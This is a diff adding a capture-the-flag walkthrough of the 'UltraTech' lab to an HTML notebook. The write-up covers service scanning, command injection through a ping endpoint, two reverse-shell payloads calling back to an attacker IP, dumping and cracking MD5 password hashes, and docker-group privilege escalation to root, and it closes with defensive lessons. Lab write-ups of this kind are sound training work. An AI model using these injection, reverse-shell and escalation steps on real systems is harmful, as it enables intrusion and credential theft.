@@ -591,6 +591,159 @@ cat flag4.txt
 # THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
 </code></pre>
 <p>Commentary: This is a <strong>build/backup pipeline abuse</strong>—executable under higher privileges outside the container boundary. Integrity of scripts under <code>/opt/backups</code> must be enforced with permissions and signing.</p>
+<div style="break-before: page; page-break-before: always;"></div><p>that's interesting
+we might get a reverse shell</p>
+<p>this is not working we might need a better shell</p>
+<pre><code class="language-bash">curl -G 'http://10.10.211.245:8081/ping' \
+  --data-urlencode $'ip=127.0.0.1`python - &lt;&lt;PY\nimport socket,os,pty\ns=socket.socket()\ns.connect(("10.23.99.212",4444))\nfor fd in (0,1,2): os.dup2(s.fileno(),fd)\npty.spawn("/bin/bash")\nPY`'
+</code></pre>
+<pre><code class="language-bash">nc -lvnp 4444
+Connection from 10.10.211.245:39338
+www@ip-10-10-211-245:~/api$ id
+id
+uid=1002(www) gid=1002(www) groups=1002(www)
+</code></pre>
+<pre><code class="language-bash">cat utech.db.sqlite 
+zz��etableusersusersCREATE TABLE users (
+            login Varchar,
+            password Varchar,
+            type Int
+���(r00tf357a0c52799563c7c7b76c1e7543a32)admin0d0ea5111e3c1def594c1684e3b9be84
+</code></pre>
+<p>Looks like we found some credentials:
+<code>r00t:f357a0c52799563c7c7b76c1e7543a32</code>
+<code>admin0d0ea5111e3c1def594c1684e3b9be84</code></p>
+<h1 id="ultratech-ctf"><a class="header" href="#ultratech-ctf">UltraTech CTF</a></h1>
+<h2 id="recon-2"><a class="header" href="#recon-2">Recon</a></h2>
+<h3 id="nmap-1"><a class="header" href="#nmap-1">Nmap</a></h3>
+<pre><code class="language-bash">nmap -sV -Pn -oN nmap.txt 10.10.211.245 -p21,22,8081,31331 -sC
+PORT      STATE SERVICE VERSION
+21/tcp    open  ftp     vsftpd 3.0.5
+22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+8081/tcp  open  http    Node.js Express framework
+31331/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+</code></pre>
+<hr />
+<h2 id="web-enumeration"><a class="header" href="#web-enumeration">Web Enumeration</a></h2>
+<h3 id="ffuf"><a class="header" href="#ffuf">ffuf</a></h3>
+<pre><code class="language-bash">ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.136.152:8081/FUZZ
+auth                    [Status: 200, Size: 39, Words: 8, Lines: 1, Duration: 202ms]
+ping                    [Status: 500, Size: 1094, Words: 52, Lines: 11, Duration: 123ms]
+</code></pre>
+<h3 id="endpoint-behavior"><a class="header" href="#endpoint-behavior">Endpoint behavior</a></h3>
+<p>Initial request:</p>
+<pre><code class="language-bash">curl 'http://10.10.216.51:8081/ping'
+</code></pre>
+<p>Response leaks stack trace:</p>
+<pre><code>TypeError: Cannot read property 'replace' of undefined
+  at app.get (/home/www/api/index.js:45:29)
+</code></pre>
+<p>Inference: Express route does <code>req.query.&lt;param&gt;.replace(...)</code> then shells out to <code>ping</code>.</p>
+<h3 id="param-discovery"><a class="header" href="#param-discovery">Param discovery</a></h3>
+<pre><code class="language-bash">curl 'http://10.10.216.51:8081/ping?ip=localhost'                       
+PING localhost(localhost6.localdomain6 (::1)) 56 data bytes
+64 bytes from localhost6.localdomain6 (::1): icmp_seq=1 ttl=64 time=0.031 ms
+
+--- localhost ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.031/0.031/0.031/0.000 ms
+</code></pre>
+<h3 id="filter-characteristics"><a class="header" href="#filter-characteristics">Filter characteristics</a></h3>
+<ul>
+<li>Testing basic commands injection technique such as semicolon <code>;</code> or pipe <code>|</code>, found out they are stripped</li>
+<li><strong>Backticks</strong> and <strong>newlines</strong> survive</li>
+</ul>
+<h3 id="proof-of-rce"><a class="header" href="#proof-of-rce">Proof of RCE</a></h3>
+<pre><code class="language-bash">curl -G 'http://10.10.211.245:8081/pingip=127.0.0.1%0Aid'                                                
+PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.072 ms
+
+--- 127.0.0.1 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.072/0.072/0.072/0.000 ms
+uid=1002(www) gid=1002(www) groups=1002(www)
+</code></pre>
+<hr />
+<h2 id="reverse-shell"><a class="header" href="#reverse-shell">Reverse Shell</a></h2>
+<pre><code class="language-bash">curl 'http://10.10.211.245:8081/ping?ip=127.0.0.1%0Abash%20-c%20%22exec%20bash%20-i%20%3E/dev/tcp/10.23.99.212/4444%202%3E%261%20%3C%261%22'
+</code></pre>
+<pre><code class="language-bash">nc -lvnp 4444
+Connection from 10.10.211.245:54508
+id
+ls
+</code></pre>
+<p>This command worked but the shell was unstabble. A better reliability came from Python PTY.</p>
+<pre><code class="language-bash">curl -G 'http://10.10.211.245:8081/ping'   --data-urlencode $'ip=127.0.0.1`python - &lt;&lt;PY
+import socket,os,pty
+s=socket.socket()
+s.connect(("10.23.99.212",4444))
+for fd in (0,1,2): os.dup2(s.fileno(),fd)
+pty.spawn("/bin/bash")
+PY
+echo 127.0.0.1`'
+</code></pre>
+<pre><code class="language-bash">nc -lvnp 4444
+Connection from 10.10.211.245:39338
+www@ip-10-10-211-245:~/api$ id
+id
+uid=1002(www) gid=1002(www) groups=1002(www)
+</code></pre>
+<hr />
+<h2 id="linux-enumeration"><a class="header" href="#linux-enumeration">Linux Enumeration</a></h2>
+<h3 id="interesting-file-sqlite-db"><a class="header" href="#interesting-file-sqlite-db">Interesting file: SQLite DB</a></h3>
+<pre><code class="language-bash">ls
+# utech.db.sqlite
+
+strings utech.db.sqlite
+# CREATE TABLE users (login Varchar, password Varchar, type Int)
+# r00t  f357a0c52799563c7c7b76c1e7543a32
+# admin 0d0ea5111e3c1def594c1684e3b9be84
+</code></pre>
+<h3 id="crack-hashes-raw-md5"><a class="header" href="#crack-hashes-raw-md5">Crack hashes (raw MD5)</a></h3>
+<p>![[crackstation.png]]
+Using Crack station, we cracked <code>r00t</code> password</p>
+<ul>
+<li><code>f357a0c52799563c7c7b76c1e7543a32</code> → <strong>n100906</strong></li>
+</ul>
+<p><code>admin</code> password was also cracked.</p>
+<h3 id="valid-local-users"><a class="header" href="#valid-local-users">Valid local users</a></h3>
+<pre><code class="language-bash">grep /bin/bash /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+lp1:x:1000:1000:lp1:/home/lp1:/bin/bash
+r00t:x:1001:1001::/home/r00t:/bin/bash
+ubuntu:x:1003:1004:Ubuntu:/home/ubuntu:/bin/bash
+</code></pre>
+<h3 id="switch-user"><a class="header" href="#switch-user">Switch user</a></h3>
+<p>Use <code>r00t : n100906</code> to move to an owned context:</p>
+<pre><code class="language-bash"># via shell on box (or SSH if permitted)
+su - r00t
+id
+# uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
+</code></pre>
+<hr />
+<h2 id="privilege-escalation"><a class="header" href="#privilege-escalation">Privilege Escalation</a></h2>
+<pre><code class="language-bash">r00t@ip-10-10-211-245:~$ id
+uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
+</code></pre>
+<p>Being in <code>docker</code> is root-equivalent. No need to pull images; host already has <code>bash:latest</code>.</p>
+<h3 id="method-bind-mount--and-chroot"><a class="header" href="#method-bind-mount--and-chroot">Method: bind-mount <code>/</code> and chroot</a></h3>
+<pre><code class="language-bash">docker image ls -a
+REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
+bash         latest    495d6437fc1e   6 years ago   15.8MB
+
+docker run --rm -it -v /:/mnt --privileged bash:latest bash -lc 'chroot /mnt /bin/bash'
+
+root@6896534b995b:/# id
+uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
+</code></pre>
+<hr />
+<h2 id="lessons-learned"><a class="header" href="#lessons-learned">Lessons Learned</a></h2>
+<ul>
+<li>Filters that delete a single metacharacter (<code>;</code>) are security theater; <strong>command substitution</strong> and <strong>newlines</strong> remain lethal.</li>
+<li>Any user in <code>docker</code> is effectively <strong>root</strong>; treat group assignment as a privileged operation.</li>
+<li>Hashes in app artifacts rapidly become credentials if they’re <strong>unsalted MD5</strong>.</li>
+<li>Deny detailed error pages to unauthenticated clients—stack traces map the code path to the bug.</li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="references"><a class="header" href="#references">References</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="tools"><a class="header" href="#tools">Tools</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="command-cheatsheet"><a class="header" href="#command-cheatsheet">Command Cheatsheet</a></h1>
